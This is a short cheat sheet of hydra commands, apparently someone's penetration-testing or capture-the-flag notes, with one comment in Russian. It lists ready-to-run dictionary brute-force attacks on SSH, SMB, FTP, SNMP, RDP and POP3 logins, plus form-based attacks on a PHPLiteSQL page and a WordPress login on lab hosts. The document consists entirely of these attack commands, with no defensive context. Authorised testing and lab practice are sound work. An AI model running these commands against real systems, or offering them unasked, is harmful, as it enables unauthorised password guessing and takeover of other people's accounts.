```bash
брутит пароль по словарю пользователя leo на ssh  
hydra -l leo -P words 192.168.1.39 ssh  
  
hydra 10.10.10.43 -l username -P /pwdlist.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:The password you entered "  
^PHPLiteSQL  
  
hydra -l username -P /pwdlist.txt apocalyst.htb http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect"  
^WordPress  
  
# hydra: bruteforce smb login   
hydra -L users.txt -P passwords.txt -e nsr smb://targetIp  
  
# hydra: bruteforce ssh login (-V, -v verbose)  
hydra -l root -P passwordlist ssh://ipv4Address -V  
  
# hydra: bruteforce ftp login  
hydra -t 5 -V -f -C /tmp/wordlist ftp://targetIp  
  
# hydra: bruteforce SNMP  
hydra -P password-file.txt -v ipv4Address snmp  
  
# hydra: bruteforce Windows Remote Desktop  
hydra -t 1 -V -f -l administrator -P /path/to/wordlist.txt rdp://ipv4Address  
  
# hydra: bruteforce POP3  
hydra -l userName -P /path/to/wordlist -f ipv4Address pop3 -V
```


